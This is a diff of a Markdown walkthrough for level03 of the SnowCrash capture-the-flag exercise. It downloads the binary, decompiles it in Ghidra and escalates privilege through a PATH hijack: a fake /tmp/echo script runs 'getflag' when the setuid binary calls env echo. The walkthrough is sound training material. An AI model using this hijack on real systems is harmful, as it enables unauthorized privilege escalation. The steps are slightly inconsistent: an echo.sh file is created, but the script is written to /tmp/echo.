@@ -10,18 +10,18 @@ password: *use previously found flag*
 ```bash
 level03@SnowCrash:~$ ls -l
     total 12
-	-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
+    -rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
 ```
 
 ## 3. Locally download the file (on local computer terminal, not VM):
 
 ```bash
-level02@SnowCrash:~$ scp -P 4242 level03@192.168.56.102:/home/user/level03/level03 ~
+level03@SnowCrash:~$ scp -P 4242 level03@<your VM's IP address>:/home/user/level03/level03 ~
 ```
 
 ## 4. Use *`Ghidra`* application to convert file into readable code
-### Once open, look to the left, *Symbol Tree* > *Functions* > *main*
-### Look at the main and find the line
+Once open, look to the left, *Symbol Tree* > *Functions* > *main*
+Look at the main and find the line
 
 ```bash
 iVar1 = system("/usr/bin/env echo Exploit me");
@@ -31,27 +31,27 @@ iVar1 = system("/usr/bin/env echo Exploit me");
 
 ```bash
 # Create script file in /tmp because it is the only directory in which we have creation/edition/deletion rights
-cd /tmp
-touch echo echo.sh
+level03@SnowCrash:~$ cd /tmp
+level03@SnowCrash:~$ touch echo echo.sh
 
 # Write the cript into echo.sh:
-echo '#!/bin/bash' > /tmp/echo
-echo 'getflag' >> /tmp/echo
+level03@SnowCrash:~$ echo '#!/bin/bash' > /tmp/echo
+level03@SnowCrash:~$ echo 'getflag' >> /tmp/echo
 
 # Give yourself the rights
-chmod +x /tmp/echo
+level03@SnowCrash:~$ chmod +x /tmp/echo
 
 # Add `/tmp` at the beginning of PATH
-export PATH="/tmp:$PATH"
+level03@SnowCrash:~$ export PATH="/tmp:$PATH"
 
 # Execute `level03` binary file
-./../home/user/level03/level03
+level03@SnowCrash:~$ ./../home/user/level03/level03
 
 # Make the script executable
-chmod +x echo.sh
+level03@SnowCrash:~$ chmod +x echo.sh
 
 # Launch the script
-./echo.sh
+level03@SnowCrash:~$ ./echo.sh
 ```
 
 The program uses the `env` command, which searches for the `echo` command in the `PATH` variable. By placing your directory (`/tmp`) at the beginning of `PATH`, your version of `echo` is found first. As a result, the program executes your script instead of the system command.
